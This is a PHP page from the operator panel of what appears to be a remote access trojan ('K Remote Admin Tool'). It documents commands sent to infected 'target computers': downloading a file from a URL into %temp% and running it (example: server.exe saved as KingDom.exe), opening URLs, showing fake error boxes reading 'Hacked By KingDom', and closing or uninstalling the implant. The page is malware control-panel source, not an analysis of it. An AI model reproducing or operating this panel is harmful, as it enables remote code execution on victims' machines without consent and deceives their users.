<?php
session_start();
if (isset($_SESSION['login'])) {
    if (!$_SESSION['login'] == '1') {
        header('location: index.php');
    }
} else {
    header('location: index.php');
}
?>
<html>
    <head>
        <link rel="stylesheet" href="style.css" type="text/css" >
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    </head>
    <body>
        <section class="header">
            <img src="image/header.png" />
        </section>
        <section class="menu">
            <a href="panel.php"><i class="fa fa-user"></i> Users List</a>
            <a href="commands.php"><i class="fa fa-terminal"></i> Commands</a>
            <a href="about.php"><i class="fa fa-info"></i> About</a>
            <a href="logout.php"><i class="fa fa-sign-out"></i> Logout</a>
        </section>
        <section class="cMain">
            <section class="cle">
                <section class="title">
                    download "<h>$Param1</h>,<h>$Param2</h>,<h>$Param3</h>,<h>$Param4</h>"
                </section>
                <section class="body">
                    This Command Use To Download a File From Url To Target Computer(s) .
                    <br><br>
                    <h>$Param1</h> : Direct File Url .
                    <br>
                    <h>$Param2</h> : Path File , And Here List Of Path (<h>%windir%</h>, <h>%temp%</h>, <h>%appdata%</h>, <h>%samepath%</h>)
                    <br>
                    <h>$Param3</h> : File Name .
                    <br>
                    <h>$Param4</h> : Rund After Download Or Not (<h>0 - Not Run</h>, <h>1 - Run</h>) .
                    <br><br>
                    <h>Example : </h> download "<h>http://www.site.com/up/server.exe</h>,<h>%temp%</h>,<h>KingDom.exe</h>,<h>1</h>"
                </section>
            </section><br>
            
            <section class="cle">
                <section class="title">
                    openurl "<h>$Param1</h>"
                </section>
                <section class="body">
                    This Command Use To Open Url Window in Target Computer(s) .
                    <br><br>
                    <h>$Param1</h> : Website Url .
                    <br><br>
                    <h>Example : </h> openurl "<h>http://www.youtube.com</h>" .
                </section>
            </section><br>
            
            <section class="cle">
                <section class="title">
                    msgbox "<h>$Param1</h>, <h>$Param2</h>"
                </section>
                <section class="body">
                    This Command Use To Show Fake Error MessageBox in Target Computer(s) .
                    <br><br>
                    <h>$Param1</h> : Title MessageBox .
                    <br>
                    <h>$Param2</h> : Content MessageBox .
                    <br><br>
                    <h>Example : </h> msgbox "<h>Hacked By KingDom</h>, <h>K Remote Admin Tool</h>" .
                </section>
            </section><br>
            
            <section class="cle">
                <section class="title">
                    close
                </section>
                <section class="body">
                    This Command Use To Close Server From Target Computer(s) .
                    <br><br>
                    <h>Without Param .</h>
                    <br><br>
                    <h>Example : </h> close .
                </section>
            </section><br>
            
            <section class="cle">
                <section class="title">
                    uninstall
                </section>
                <section class="body">
                    This Command Use To uninstall Server From Target Computer(s) .
                    <br><br>
                    <h>Without Param .</h>
                    <br><br>
                    <h>Example : </h> uninstall .
                </section>
            </section><br>
            
        </section><br><br><p>&nbsp;</p>
    </body>
</html>